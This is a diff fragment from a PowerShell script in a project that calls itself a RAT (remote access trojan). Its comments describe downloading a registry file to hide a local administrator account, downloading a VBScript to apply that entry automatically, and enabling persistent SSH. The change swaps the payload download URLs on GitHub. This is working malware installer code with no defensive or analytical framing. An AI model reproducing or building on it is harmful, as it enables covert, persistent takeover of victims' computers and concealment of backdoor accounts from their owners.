@@ -38,11 +38,11 @@ cd $temp_dir
 
 # Download registry to hide local admin
 $reg_file = random_text
-iwr -Uri "https://raw.githubusercontent.com/Soumyo001/Project-0nlyRAT/refs/heads/main/files/admin.reg" -OutFile ".\$reg_file.reg"
+iwr -Uri "https://raw.githubusercontent.com/Soumyo001/Project-0nlyRAT/refs/heads/main/payloads/admin.reg" -OutFile ".\$reg_file.reg"
 
 # Download VbScript file which will automate our registry entry
 $vbs_file = random_text
-iwr -Uri "https://raw.githubusercontent.com/Soumyo001/Project-0nlyRAT/refs/heads/main/files/confirm.vbs" -OutFile ".\$vbs_file.vbs"
+iwr -Uri "https://raw.githubusercontent.com/Soumyo001/Project-0nlyRAT/refs/heads/main/payloads/confirm.vbs" -OutFile ".\$vbs_file.vbs"
 
 # enable persistent ssh
 # Install the OpenSSH Client
